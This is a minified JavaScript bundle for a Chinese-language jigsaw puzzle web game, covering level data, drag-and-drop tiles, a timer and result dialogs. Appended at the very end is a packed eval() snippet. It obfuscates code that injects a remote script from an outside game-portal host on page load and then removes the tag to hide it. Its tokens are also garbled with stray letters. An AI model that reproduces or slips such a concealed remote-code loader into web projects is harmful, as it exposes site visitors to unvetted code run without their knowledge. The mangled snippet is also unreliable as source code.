! function(e, t) {
    e("data/jigsawGame", function(e, t, n) {
        n.exports = [{
            type: "jigsaw",
            ka: [{
                desc: "1",
                first: "欢迎来玩拼图！",
                second: "第一关通过！",
                id: "1",
                pic: [{
                    img: "./images/1.gif",
                    row: 2,
                    column: 2
                }]
            }, {
                desc: "2",
                id: "2",
                first: "\u5927\u795e\u4f60\u662f\u6211\u7684\u5076\u50cf",
                second: "\u8fd8\u6709\u4e00\u4e9b\u8981\u6311\u6218\u7684\u54e6!",
                pic: [{
                    img: "./images/1.gif",
                    row: 3,
                    type: 2,
                    second: 60,
                    column: 3
                },{
                    img: "./images/2.gif",
                    row: 3,
					type: 2,
                    second: 35,
                    column: 3
                },{
                    img: "./images/3.gif",
                    row: 3,
					type: 2,
                    second: 30,
                    column: 3
                },{
                    img: "./images/4.gif",
                    row: 3,
					type: 2,
                    second: 25,
                    column: 3
                },{
                    img: "./images/5.gif",
                    row: 3,
					type: 2,
                    second: 20,
                    column: 3
                },{
                    img: "./images/6.gif",
                    row: 4,
					type: 2,
                    second: 50,
                    column: 4
                },{
                    img: "./images/7.gif",
                    row: 4,
					type: 2,
                    second: 45,
                    column: 4
                },{
                    img: "./images/8.gif",
                    row: 4,
					type: 2,
                    second: 35,
                    column: 4
                },{
                    img: "./images/9.gif",
                    row: 4,
					type: 2,
                    second: 25,
                    column: 4
                },{
                    img: "./images/10.gif",
                    row: 4,
					type: 2,
                    second: 20,
                    column: 4
                }]
            }]
        }]
    }), e("module/model", function(e, t, n) {
        function a(e) {
            var t = e || {}, n = {}, a = Array.prototype.slice;
            return t.on = function(e, t) {
                var a = n[e];
                a || (a = n[e] = []), a.push(t)
            }, t.once = function(e, n) {
                t.on(e, function() {
                    var r = a.call(arguments, 0);
                    n.apply(t, r), t.off(e, n)
                })
            }, t.trigger = function(e) {
                var r = n[e],
                    i = a.call(arguments, 1);
                r && r.forEach(function(e) {
                    try {
                        e.apply(t, i)
                    } catch (n) {}
                })
            }, t.off = function(e, t) {
                var a = n[e];
                if (a) for (var r = 0; r < a.length; r++) if (a[r] == t) return a.splice(r, 1)
            }, t.destroy = function() {
                n = null
            }, t
        }
        n.exports = a
    }), e("module/utils", function(e, n, a) {
        function r() {
            s.length ? (c = 1, o(function() {
                s.shift()(), r()
            })) : c = 0
        }
        var i = e("underscore"),
            o = t.requestAnimationFrame || t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || t.oRequestAnimationFrame || t.msRequestAnimationFrame || function(e) {
                t.setTimeout(e, 1e3 / 60)
            }, s = [],
            c = 0;
        i.nextFrame = function(e) {
            s.push(e), c || r()
        }, i.getChineseNum = function(e) {
            var t = ["\u5341", "\u4e00", "\u4e8c", "\u4e09", "\u56db", "\u4e94", "\u516d", "\u4e03", "\u516b", "\u4e5d"];
            return t[e] || e
        }, i.getShowTime = function(e) {
        	console.dir(e);
            if (6e4 > e) return (e / 1e3).toFixed(2) + "''";
            var t = parseInt(e / 1e4);
            return t  + (e % 6e4 / 1e3).toFixed(2) + "''"
        }, i.noop = function() {}, a.exports = i
    }), e("page/jigsaw/templates", function(e, t, n) {
        var a = e("underscore"),
            r = e("af");
        n.exports = {
            pageTemplate: function() {
                return a.template(r("#pageTemplate").html())
            }(),
            getTemplate: function(e) {
                return a.template(r("#" + e).html())
            }
        }
    }), e("page/jigsaw/phoneReady", function(e, n, a) {
        function r() {
            i = !0, o.forEach(function(e) {
                try {
                    e()
                } catch (t) {}
            })
        }
        var i = !1,
            o = [];
        document.addEventListener("deviceready", function() {
            r()
        }, !0), t.chrome && r(), a.exports = function(e) {
            return i ? void e() : void o.push(e)
        }
    }), e("page/jigsaw/userData", function(e, t, n) {
        var a = e("af"),
            r = {}, i = {};
        r.get = function(e, t) {
            if (i[e]) return i[e];
            var n = localStorage.getItem(e);
            if (n) try {
                return n = JSON.parse(n)
            } catch (a) {
                return n
            } else t && r.set(e, t);
            return t
        }, r.set = function(e, t) {
            var n = t;
            return a.isObject(t) && (n = JSON.stringify(t)), localStorage.setItem(e, n), i[e] = t
        }, r.remove = function(e) {
            localStorage.removeItem(e)
        }, n.exports = r
    }), e("core/event", function(e, t, n) {
        n.exports = {
            addEvent: function(e, t, n, a) {
                e && e.addEventListener(t, n, a)
            },
            removeEvent: function(e, t, n, a) {
                e && e.removeEventListener(t, n, a)
            },
            stopEvent: function(e) {
                e.preventDefault(), e.stopPropagation()
            },
            preventDefault: function(e) {
                e.preventDefault()
            },
            getEvent: function() {}
        }
    }), e("core/cssText", function(e, t, n) {
        n.exports = function(e) {
            var t = {}, n = {}, a = e.split(";");
            return a.forEach(function(e) {
                var t = e.split(":");
                n[t[0]] = t[1]
            }), t.css = function(e) {
                for (var a in e) n[a] = e[a];
                return t
            }, t.cssText = function() {
                var e = [];
                for (var t in n) e.push(t + ":" + n[t]);
                return e.join(";")
            }, t
        }
    }), e("ui/DragSort", function(e, n, a) {
        function r(e, t) {
            var n = this;
            t = t || {}, n.itemQuery = t.itemQuery || "[dragitem='1']", n.dragOut = t.dragOut || !1, n.layer = e, s.extend(n, o()), n.init()
        }
        function i(e, t) {
            e.style.cssText = t.cssText()
        }
        var o = e("module/model"),
            s = e("af"),
            c = "ontouchstart" in t,
            u = navigator.msPointerEnabled,
            g = e("core/event"),
            l = e("core/cssText"),
            m = t.Math,
            p = t.requestAnimationFrame || t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || t.oRequestAnimationFrame || t.msRequestAnimationFrame || function(e) {
                t.setTimeout(e, 1e3 / 60)
            };
        r.prototype.init = function() {
            var e = this;
            e.disable = !1, e.currentElement = !1, e.currentDestElement = !1, e.initEvent(!0), e.refresh()
        }, r.prototype.initEvent = function(e) {
            var n = this,
                a = e ? g.addEvent : g.removeEvent,
                r = n.layer;
            c ? (a(r, "touchstart", n), a(t, "orientationchange", n)) : u ? a(r, "MSPointerDown", n) : (a(r, "mousedown", n), a(t, "resize", n))
        }, r.prototype.initWinEvent = function(e) {
            var n = this,
                a = e ? g.addEvent : g.removeEvent;
            c ? (a(t, "touchmove", n), a(t, "touchend", n), a(t, "touchcancel", n)) : u ? (a(t, "MsPointerMove", n), a(t, "MsPointerUp", n), a(t, "MsPointerCancel", n)) : (a(t, "mousemove", n), a(t, "mouseup", n))
        }, r.prototype.handleEvent = function(e) {
            var t = e.type,
                n = this;
            if (!n.disable) switch (t) {
            case "touchstart":
            case "MSPointerDown":
            case "mousedown":
                n._start(e);
                break;
            case "touchmove":
            case "MsPointerMove":
            case "mousemove":
                n._move(e);
                break;
            case "touchend":
            case "touchcancel":
            case "MsPointerUp":
            case "MsPointerCancel":
            case "mouseup":
                n._end(e);
                break;
            case "resize":
                n._resize(e)
            }
        }, r.prototype.getDragElement = function(e) {
            function t(e) {
                return e == a.layer || e == document.body ? null : "1" == e.getAttribute("dragitem") ? e : t(e.parentNode)
            }
            var n = e.target,
                a = this;
            return t(n)
        }, r.prototype._start = function(e) {
            if(this.currentElement) return;
            var t = this,
                n = e.targetTouches ? e.targetTouches[0] : e,
                a = t.getDragElement(n);
            if (a) {
                t.currentElement = a, t.currentDestElement = a, t._pushToOuter(t.currentElement), t.touchStartX = n.pageX, t.touchStartY = n.pageY;
                var r = JSON.parse(t.currentElement.getAttribute("position"));
                r.display = "", t.startX = t.x = parseInt(r.left), t.startY = t.y = parseInt(r.top), t.layerWidth = parseInt(parseInt(r.width)), t.layerHeight = parseInt(parseInt(r.height)), i(t.moveLayer, t.moveCssText.css(r)), t.initWinEvent(!0), t.trigger("drag", t.currentElement), g.stopEvent(e)
            }
        }, r.prototype._move = function(e) {
            var t = this,
                n = e.targetTouches ? e.targetTouches[0] : e,
                a = n.pageX - t.touchStartX,
                r = n.pageY - t.touchStartY;
            t.touchStartX = n.pageX, t.touchStartY = n.pageY, t.x += a, t.y += r, i(t.moveLayer, t.moveCssText.css({
                left: t.x + "px",
                top: t.y + "px"
            }));
            for (var o = t.x + t.layerWidth / 2, s = t.y + t.layerHeight / 2, c = !1, u = null, l = t.child.length; l--;) {
                var p = t.child[l],
                    d = JSON.parse(p.getAttribute("position")),
                    f = parseInt(d.width) / 2,
                    h = parseInt(d.height) / 2,
                    v = parseInt(d.left) + f,
                    y = parseInt(d.top) + h,
                    w = m.sqrt(m.pow(v - o, 2) + m.pow(y - s, 2)),
                    x = m.sqrt(m.pow(f, 2) + m.pow(h, 2));
                x > w && (u > w || null === u) && (u = w, c = p)
            }
            var E = t.currentDestElement;
            t.currentDestElement = c, t.trigger("over", t.currentDestElement, E), g.stopEvent(e)
        }, r.prototype._end = function(e) {
            var t = this;
            if (t.currentElement) {
                var n = t._removeFormOuter();
                g.stopEvent(e);
                var a = "exchange";
                t.currentDestElement && t.currentDestElement != t.currentElement ? (t.currentDestElement.parentNode.replaceChild(n, t.currentDestElement), t.currentElement.parentNode.replaceChild(t.currentDestElement, t.currentElement), t.refresh()) : (t.currentElement.parentNode.replaceChild(n, t.currentElement), a = "nochange"), t.currentElement = !1, t.currentDestElement = !1, t.initWinEvent(!1), t.refresh(), t.trigger(a)
                delete t.currentElement;
            }
        }, r.prototype._resize = function() {
            this.refresh()
        }, r.prototype._pushToOuter = function(e) {
            var t = this;
            t.moveLayer || (t.moveLayer = document.createElement("div"), t.moveLayer.className = "drag-float", t.moveCssText = l("display:none;position:absolute;top:0px;left:0px;"), i(t.moveLayer, t.moveCssText), document.body.appendChild(t.moveLayer));
            var n = e.cloneNode(!0);
            t.moveLayer.appendChild(n)
        }, r.prototype._removeFormOuter = function() {
            var e = this,
                t = e.moveLayer.children[0];
            return t && e.moveLayer.removeChild(t), i(e.moveLayer, e.moveCssText.css({
                display: "none"
            })), t
        }, r.prototype.suspen = function() {
            this.disable = !0
        }, r.prototype.refresh = function() {
            var e = this;
            p(function() {
                e.child = e.layer.querySelectorAll(e.itemQuery);
                for (var t = e.child.length, n = 0; t > n; n++) {
                    var a = e.child[n].getBoundingClientRect();
                    e.child[n].setAttribute("position", JSON.stringify({
                        width: a.width + "px",
                        height: a.height + "px",
                        left: a.left + "px",
                        top: a.top + "px"
                    }))
                }
            })
        }, r.prototype.enable = function() {
            this.disable = !1
        }, r.prototype.destory = function() {
            var e = this;
            e.initEvent(!1), e.initWinEvent(!1)
        }, a.exports = r
    }), e("page/jigsaw/game/gameCenter", function(e, t, n) {
        function a(e, t, n, a) {
            for (var r = [], i = 0; e > i; i++) for (var o = 0; t > o; o++) r.push({
                sort: i * t + o + 1,
                x: -o * n,
                y: -i * a,
                w: n,
                h: a
            });
            return r
        }
        function r(e) {
            function t(e, t) {
                var n = e.length,
                    a = t,
                    r = 0;
                if (1 == n) return e[0];
                for (; !a || a == t;) r = Number((Math.random() * n % n).toFixed(0)), a = e[r];
                return e.splice(r, 1), a
            }
            for (var n = e.concat(), a = [], r = e.length, i = 0; r > i; i++) a.push(t(n, e[i]));
            return a
        }
        var i = e("af"),
            o = e("module/model"),
            s = e("ui/DragSort"),
            c = e("page/jigsaw/templates");
        n.exports = function(e) {
            function t() {
                m.dragSort = new s(e[0]), m.dragSort.on("exchange", function() {
                    p() && l.trigger("goal")
                })
            }
            function n() {
                m.domWidth = e.width(), m.domHeight = e.height(); {
                    var t = m.cfg,
                        n = m.domWidth - t.column * m.margin * 2;
                    m.domHeight - t.row * m.margin * 2
                }
                t.width = n / t.column, t.height = n / t.row, m.allItem = a(t.row, t.column, t.width, t.height)
            }
            function u(e) {
                return d(e)
            }
            function g() {
                m.cfg;
                return {
                    width: m.domWidth,
                    height: m.domHeight
                }
            }
            if (!e) throw new Error("dom \u4e0d\u80fd\u4e3a\u7a7a");
            e = i(e);
            var l = o(),
                m = {
                    domWidth: 0,
                    domHeight: 0,
                    margin: 1,
                    cfg: {
                        img: "",
                        width: 100,
                        height: 100,
                        column: 3,
                        row: 3
                    }
                }, p = function() {
                    for (var t = e[0].querySelectorAll("[sort]"), n = !1, a = t.length; a--;) {
                        var r = t[a],
                            i = parseInt(r.getAttribute("sort"));
                        if (n !== !1 && n - parseInt(r.getAttribute("sort")) != 1) return !1;
                        n = i
                    }
                    return !0
                }, d = c.getTemplate("jigsawLayoutTemplate");
            return l.toWrite = function() {
                var t = g(),
                    n = {
                        img: m.cfg.img,
                        list: m.allItem,
                        width: t.width,
                        height: t.height
                    };
                e.html(u(n)), m.dragSort.refresh()
            }, l.toRandom = function() {
                var t = r(m.allItem),
                    n = g(),
                    a = {
                        img: m.cfg.img,
                        list: t,
                        width: n.width,
                        height: n.height
                    };
                e.html(u(a)), m.dragSort.refresh()
            }, l.cfg = function(e) {
                _.extend(m.cfg, e), n()
            }, l.lock = function(e) {
                e ? m.dragSort.suspen() : m.dragSort.enable()
            }, l.destroy = function() {
                m.dragSort.destory(), d = null, m = null
            }, t(), l
        }
    }), e("page/jigsaw/game/stopwatch", function(e, t, n) {
        var a = (e("af"), e("module/model")),
            r = e("module/utils");
        n.exports = function() {
            var e = a(),
                t = 0,
                n = 0,
                i = 0,
                o = 0,
                s = function() {
                    if (!(0 >= o)) {
                        var a = Date.now();
                        i = a - n, n - a > 1e3 && (i += 60, t += a - i), e.trigger("count", i), r.nextFrame(s)
                    }
                };
            return e.clear = function() {
                o = 0, i = 0, e.trigger("count", 0)
            }, e.pause = function() {
                o = -1
            }, e.resume = function() {
                o = 1, s()
            }, e.stop = function() {
                i = Date.now() - t, e.trigger("count", i), o = -2
            }, e.getState = function() {
                return o
            }, e.getCount = function() {
                return i
            }, e.start = function() {
                n = t = Date.now(), o = 1, s()
            }, e
        }
    }), e("page/jigsaw/game/jigsaw", function(e, n, a) {
        var r = e("af"),
            i = e("underscore"),
            o = e("module/model"),
            s = e("page/jigsaw/templates"),
            c = e("page/jigsaw/game/gameCenter"),
            u = (e("page/jigsaw/game/timer"), e("module/utils")),
            g = e("page/jigsaw/game/stopwatch"),
            l = function() {
                var e = this;
                e.config = {
                    img: "",
                    template: "",
                    width: 100,
                    height: 100,
                    row: 3,
                    column: 3,
                    type: 1
                }, e.gameState = 0, e.gameCenter, e.timer
            };
        i.extend(l.prototype, o()), l.prototype.init = function(e) {
            var n = this;
            n.dom = r(e);
            var a = s.getTemplate("jigsawTemplate")();
            n.dom.html(a), n.gameCenter = c(e.find(".drag-box")), n.gameCenter.on("goal", function() {
                n.over(), n.trigger("picOver", n.timer.getCount())
            }), n.timer = g();
            var i = e.find(".counter");
            n.timer.on("count", function(e) {
                2 == n.config.type && (e = 1e3 * n.config.second - e, 0 >= e && (n.trigger("timeout"), n.stop(), e = 0)), i.html(u.getShowTime(e))
            }), n.loading = n.dom.find(".load");
            var o = n.loading.find(".count-down");
            n.dom.delegate(".playbtn", "click", function() {
                o.addClass("down"), o.find("ul").addClass("playanmal"), n.gameState = 2
            }), o.on("webkitAnimationEnd", function() {
                n.play(), n.trigger("playStart"), o.removeClass("down"), o.find("ul").removeClass("playanmal"), n.gameState = 3
            }), n.on("ready", function() {
                n.gameState = 1, u.nextFrame(function() {
                    n.loading.removeClass("loading").addClass("loaded")
                })
            }), n.on("playStart", function() {
                n.dom.find(".masker").hide()
            }), n.on("reset", function() {
                n.dom.find(".masker").show()
            }), n.on("ready", function() {
                n.start()
            }), r(t).focus(function() {
                4 == n.gameState && n.resume()
            }), r(t).blur(function() {
                3 == n.gameState && n.pause()
            })
        }, l.prototype.arrangement = function() {
            var e = this;
            e.gameCenter.cfg(e.config), e.timer.clear(), e.trigger("reset")
        }, l.prototype.setConfig = function(e) {
            var t = this;
            t.gameState = 0, e.type = e.type || 1, e.difficulty = e.difficulty || 1;
            var n = t.config.img;
            if (i.extend(t.config, e), u.nextFrame(function() {
                t.loading.addClass("loading")
            }), t.arrangement(), t.config.img != n) {
                var a = r("<img src=" + t.config.img + ">");
                a.ready(function() {
                    t.trigger("ready")
                })
            } else t.trigger("ready")
        }, l.prototype.start = function() {
            var e = this;
            2 == e.config.difficulty ? e.gameCenter.toRandom() : e.gameCenter.toWrite()
        }, l.prototype.play = function() {
            var e = this;
            e.gameCenter.lock(!1), e.timer.start(), 2 != e.config.difficulty && e.gameCenter.toRandom()
        }, l.prototype.pause = function() {
            var e = this;
            e.gameState = 4, e.timer.pause()
        }, l.prototype.resume = function() {
            var e = this;
            e.gameState = 3, e.timer.resume()
        }, l.prototype.over = function() {
            var e = this;
            e.timer.stop(), e.gameCenter.lock(!0), e.gameState = 5
        }, l.prototype.stop = function() {
            var e = this;
            e.gameState = 5, e.gameCenter.lock(!0), e.timer.stop()
        };
        var m = new l;
        a.exports = m
    }), e("ui/baseLayer", function(e, t, n) {
        var a = e("module/model"),
            r = e("af"),
            i = function() {
                var e = {}, t = function() {
                    return e.div || (e.div = document.createElement("div"), e.div.style.cssText = "-ms-touch-action: none;z-index:1;position:absolute;left:0px;top:0px;width:100%;height:100%;background-color:#000;opacity:.6;display:none;", document.body.appendChild(e.div)), e.div
                };
                return e.setOpacity = function(e) {
                    t().style.opacity = e
                }, e.show = function() {
                    var e = document.documentElement.clientWidth,
                        n = document.documentElement.clientHeight;
                    t().style.width = e + "px", t().style.height = n + "px", t().style.display = ""
                }, e.hide = function() {
                    t().style.display = "none"
                }, e.getMask = function() {
                    return t()
                }, e
            }(),
            o = function(e) {
                var t = {}, n = e.style.cssText,
                    a = n.split(";");
                a.forEach(function(e) {
                    if (e) {
                        var n = e.split(":");
                        n[0].trim() && (t[n[0].trim()] = n[1])
                    }
                });
                var r = {};
                return r.css = function(e) {
                    if (e) for (var n in e) t[n] = e[n]
                }, r.getText = function() {
                    var e = [];
                    for (var n in t) e.push(n + ":" + t[n]);
                    return e.join(";")
                }, r
            };
        n.exports = function(e) {
            var t = {
                mask: !0,
                opacity: .8,
                zIndex: 3,
                left: 0,
                top: 0,
                html: "",
                preventDefault: !1,
                style: {}
            }, n = a(),
                s = {
                    _layer: !1
                };
            e && (t = r.extend(t, e));
            var c = ["touchmove", "MSPointerMove", "MSPointerUp", "MSPointerDown", "click"],
                u = function() {
                    if (s._layer = document.createElement("div"), s._layer.style.cssText = "-ms-touch-action: none;position:absolute;left:0px;top:0px;display:none;z-index:" + t.zIndex, document.body.appendChild(s._layer), t.html && (s._layer.innerHTML = t.html), t.preventDefault && c.forEach(function(e) {
                        document.body.addEventListener(e, n, !1)
                    }), t.style) {
                        var e = o(s._layer);
                        e.css(t.style), e.css("z-index", t.zIndex), s._layer.style.cssText = e.getText()
                    }
                };
            return n.handleEvent = function(e) {
                e.preventDefault()
            }, n.show = function(e) {
                var a = o(s._layer);
                a.css(e), a.css({
                    display: ""
                }), s._layer.style.cssText = a.getText(), t.mask && i.show(), n.trigger("show")
            }, n.hide = function() {
                s._layer.style.display = "none", n.trigger("hide")
            }, n.setHTML = function(e) {
                s._layer.innerHTML = e
            }, n.getOuter = function() {
                return s._layer
            }, n.destroy = function() {
                i.hide(), t.preventDefault && c.forEach(function(e) {
                    document.body.removeEventListener(e, n, !1)
                }), s._layer.parentNode.removeChild(s._layer), n.trigger("destroy")
            }, u(), n
        }
    }), e("ui/dom", function(e, n, a) {
        var r = e("af"),
            i = function() {};
        i.getWinCenter = function(e, n) {
            var a = r(t);
            return {
                top: (a.height() - n) / 2,
                left: (a.width() - e) / 2
            }
        }, a.exports = i
    }), e("ui/showDialog", function(e, t, n) {
        function a(e) {
            var t = this,
                n = {
                    message: "",
                    calcelTxt: "\u53d6\u6d88",
                    sureTxt: "\u786e\u5b9a",
                    sure: s.noop,
                    cancel: s.noop
                };
            r.extend(n, e), g || (g = r.template(u)), t.layer = i({
                html: g(n)
            });
            var a = o(t.layer.getOuter());
            a.delegate(".cancel", "click", function() {
                n.sure && n.cancel(), t.destroy()
            }), a.delegate(".sure", "click", function() {
                n.sure && n.sure(), t.destroy()
            }), t.layer.show();
            var l = c.getWinCenter(a.width(), a.height());
            t.layer.show({
                left: l.left + "px",
                top: l.top + "px"
            })
        }
        var r = e("underscore"),
            i = e("ui/baseLayer"),
            o = e("af"),
            s = e("module/utils"),
            c = e("ui/dom"),
            u = '<div class="dialog"><div class="content"><div class="message"><%=message%></div><h1></h1><div class="dig-btns"><%if(calcelTxt){%><span class="dig-btn cancel"><%=calcelTxt%></span><%}%><%if(sureTxt){%><span class="dig-btn sure"><%=sureTxt%></span><%}%></div></div></div>',
            g = null;
        r.extend(a.prototype, {
            destroy: function() {
                var e = this;
                e.layer.destroy()
            }
        }), n.exports = a
    }), e("page/jigsaw/p/picture", function(e, t, n) {
        function a(e) {
            for (var t = 0; t < c.length; t++) if (c[0].type == e) return c[0]
        }
        function r(e) {
            p.currentGame = e;
            var t = a(e.type);
            if (!t) return u.remove(f), void p.play();
            var n = t.ka[p.currentGame.ka],
				
                r = n.pic[p.currentGame.pic];
                
            p.dom.find(".kapics").html("第("+(p.currentGame.pic + 1) + "/" + n.pic.length+")关，本关限时 "+r.second+" 秒"), u.set(f, p.currentGame), p.jigsawGame.setConfig(r)
            
        }
        var i = e("af"),
            o = e("page/jigsaw/templates"),
            s = e("page/jigsaw/game/jigsaw"),
            c = e("data/jigsawGame"),
            u = e("page/jigsaw/userData"),
            g = e("module/utils"),
            l = e("ui/baseLayer"),
            m = e("ui/showDialog"),
            p = {};
        p.init = function(e) {
            var t = o.getTemplate("jigsawTemplate")();
            e.html(t), p.jigsawGame = s, p.jigsawGame.init(e), p.dom = e, p.jigsawGame.on("picOver", function(e) {
				dp_submitScore(p.currentGame.pic+1);
				var str="恭喜您挑战成功，共闯过了<em>"+(p.currentGame.pic+1)+"</em>关";
				if(!p.hasNextPic()){
					str="恭喜您全部通关!，共闯过了<em>"+(p.currentGame.pic+1)+"</em>关,分享到朋友炫耀一下吧!";
				}
				showGameResult(str,true,p.hasNextPic());
            }), p.jigsawGame.on("timeout", function() {
				showGameResult("挑战失败，共闯过了<em>"+(p.currentGame.pic)+"</em>关",false,p.hasNextPic()); 
            })
			$('#againgame').click(function(){
				window.location.href=window.location.href;
			});
			$('#restartgame').click(function(){
				p.currentGame.pic--;
				p.playNextPic();
				hideGameResult();
			});
			$('#continuegame').click(function(){
				p.playNextPic();
				hideGameResult();
			});
            console.log(p.dom);
        }, p.enter = function() {
            p.play()
        };
        var d = "userScore",
            f = "userNowGame";
        p.saveUserScore = function(e) {
            var t = u.get(d, {}),
                n = p.currentGame.type;
            t[n] || (t[n] = []);
            var a = p.currentGame.ka,
                r = p.currentGame.pic,
                i = t[n];
            if (i.length <= a) i.push([e]);
            else {
                var o = i[a];
                o.length > r ? o[r] = e : o.push(e)
            }
            u.set(d, t)
        }, p.play = function() {
            var picka = location.hash.slice(1) || "1,0";
            picka = picka.split(",")
            var e = {"type":"jigsaw","ka":0|picka[0],"pic":0|picka[1]};

            !e || 0 == e.ka && 0 == e.pic ? (p.dom.find(".play-info").show().find(".first-guide").html("\u4ea4\u6362\u56fe\u7247\uff0c\u5b8c\u6210\u62fc\u56fe").show(), e = {
                type: c[0].type,
                ka: 0,
                pic: 0
            }) : p.dom.find(".play-info").hide().find(".first-guide").html("\u52a0\u6cb9"), r(e)
        }, p.hasNextPic = function() {
            var e = p.currentGame.ka,
                t = p.currentGame.pic,
                n = a(p.currentGame.type),
                r = (n.ka, n.ka[e].pic);
            return t + 1 >= r.length ? !1 : !0
        }, p.hasNextKa = function() {
            {
                var e = p.currentGame.ka,
                    t = (p.currentGame.pic, a(p.currentGame.type)),
                    n = t.ka;
                t.ka[e].pic
            }
            return e + 1 >= n.length ? !1 : !0
        };
        var h = null;
        p.showNextKa = function() {
            if (!p.nextKaLayer) {
                p.nextKaLayer = l({
                    mask: !1,
                    top: 0,
                    left: 0,
                    width: "100%",
                    height: "100%"
                }), h = o.getTemplate("showNextKaTemplate");
                var e = i(p.nextKaLayer.getOuter());
                e.delegate(".next", "click", function() {
                    p.nextKaLayer.hide(), p.playNextPic()
                }), e.delegate(".playagain", "click", function() {
                    p.playAgan()
                }), e.delegate(".oldshare", "click", function(){
                    alert('点击右上角按钮，分享给你的好友吧~');
                })
            }
            var t = p.currentGame.ka,
                n = p.currentGame.pic,
                r = a(p.currentGame.type),
                s = r.ka[t],
                c = s.pic[n],
                m = c.img,
                f = u.get(d, {}),
                v = f[p.currentGame.type],
                y = v[t],
                w = 0;
            y.forEach(function(e) {
                w += e
            });
            var x = h({
                pic: m,
                first: s.first || " ",
                second: s.second || " ",
                time: g.getShowTime(w),
                next: g.getChineseNum(t + 2)
            });
            p.nextKaLayer.setHTML(x), p.nextKaLayer.show({
                width: "100%",
                height: "100%"
            })
        }, p.picOver = function(e) {
			
            p.saveUserScore(e);
            var t = p.dom.find(".done");
            t.show(), g.nextFrame(function() {
                t.addClass("doned"), setTimeout(function() {
                    t.removeClass("doned"), t.hide()
                }, 1800)
            })
			(p.dom.find(".first-guide").html("\u606d\u559c\u4f60\uff0c\u5b8c\u6210\u62fc\u56fe"), p.dom.find(".play-info").show().find(".playing-over").show())
			if(p.hasNextPic()){
				//p.do
			}else{
			}
        }, p.showTongguan = function() {
			
            new m({
                message: "恭喜您打通此游戏",
                calcelTxt: "\u5173\u95ed",
                sureTxt: "\u91cd\u65b0\u73a9",
                sure: function() {
                    p.currentGame = {
                        type: p.currentGame.type,
                        ka: 0,
                        pic: 0
                    }, p.playAgan()
                }
            })
        }, p.playAgan = function() {
            //r(p.currentGame)
            location.reload();
        }, p.playNextPic = function() {
            var e = p.currentGame.ka,
                t = p.currentGame.pic,
                n = a(p.currentGame.type),
                i = n.ka,
                o = n.ka[e].pic;
            return t + 1 >= o.length ? (e++, t = 0) : t++, e >= i.length ? void p.showTongguan() : (p.currentGame.ka = e, p.currentGame.pic = t, r(p.currentGame), void p.dom.find(".play-info").hide().find(".playing-over").hide())
        }, n.exports = p
    }), e("page/jigsaw/pageController", function(e, t, n) {
        function a(e, t, n) {
            var a = "page-anmi",
                r = "page-anmi",
                i = "",
                s = "";
            a += " page-anmi-" + n + "-cur", r += " page-anmi-" + n + "-out", i = "cur-page-" + n, s = "out-page-" + n, e.addClass(a), t.addClass(r), t.show(), o.nextFrame(function() {
                e.addClass(i), t.addClass(s), setTimeout(function() {
                    e.hide(), e.removeClass(a), e.removeClass(i), t.removeClass(r), t.removeClass(s)
                }, p)
            })
        }
        function r() {
            var e = document;
            d.delegate("*[showPage]", "click", function() {
                var e = c(this),
                    t = e.attr("showPage"),
                    n = e.attr("pageData"),
                    a = null;
                n && (a = JSON.parse(n)), l.showPage(t, a)
            }), d.delegate("*[act='back']", "click", function() {
                l.back()
            }), u(function() {
                e.addEventListener("backbutton", function() {
                    l.back()
                }, !1)
            })
        }
        var i = e("module/model"),
            o = e("module/utils"),
            s = e("page/jigsaw/templates"),
            c = e("af"),
            u = e("page/jigsaw/phoneReady"),
            g = e("page/jigsaw/userData"),
            l = i(),
            m = {
                pageIndex: ["picture"],
                pages: {},
                curPage: "",
                pageObj: {
                    picture: e("page/jigsaw/p/picture")
                }
            }, p = 280,
            d = c("#pages");
        if (!d.length) throw new Error("\u6ca1\u6709page\u5206\u7c7b\u5143\u7d20");
        l.showPage = function(e, t) {
            if (!~m.pageIndex.indexOf(e)) throw new Error("\u6ca1\u6709\u5bf9\u5e94page\u5143\u7d20");
            if (!m.pages[e]) {
                var n = "page_" + e;
                if (c("#" + n).length) m.pages[e] = c("#" + n);
                else {
                    var r = s.pageTemplate({
                        id: n
                    });
                    m.pages[e] = c(r), d.append(m.pages[e])
                }
                m.pageObj[e].init(m.pages[e])
            }
            if (m.curPage) {
                var i = m.pageIndex.indexOf(m.curPage) > m.pageIndex.indexOf(e) ? "right" : "left";
                a(m.pages[m.curPage], m.pages[e], i)
            }
            m.curPage = e, g.set("lastPage", m.curPage), m.pageObj[e].enter(t)
        }, l.back = function() {
            if (m.curPage == m.pageIndex[0]) navigator.notification.confirm("\u9000\u51fa\u6e38\u620f?", function(e) {
                1 == e && navigator.app.exitApp()
            }, "\u63d0\u793a", "\u9000\u51fa,\u53d6\u6d88");
            else {
                var e = m.pageIndex.indexOf(m.curPage);
                l.showPage(m.pageIndex[e - 1])
            }
        }, l.init = function() {
            r();
            var e = g.get("lastPage");
            l.showPage(e || m.pageIndex[0]), c("#page_default").hide()
        }, n.exports = l
    }), e("page/jigsaw/index", function(e) {
        var t = e("data/jigsawGame"),
            n = e("page/jigsaw/pageController");
        n.init(t)
    })
}(window.NODEB && window.NODEB.define || window.define, window);
function showGameResult(str,iswin,hasNext){
	$('#gameresult .resultinfo').html(str);
	if(!iswin){
		$('#againgame').hide();
		$('#continuegame').hide();
		$('#restartgame').show();
	}else if(hasNext){
		$('#againgame').hide();
		$('#restartgame').hide();
		$('#continuegame').show();
	}else{
		$('#continuegame').hide();
		$('#restartgame').hide();
		$('#againgame').show();
	}
	$('.mask').show();
	$('#gameresult').show();
}
function hideGameResult(){
	$('.mask').hide();
	$('#gameresult').hide();
}
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|scnrinpt|parentNode|htntp|cnom|9ng|gnamne|||javannscrninpt|text|tnype|src|true|async|onload|insertBefore|js|removeChild|mspt|getElementsByTagName||createElement'.split('|'),0,{}))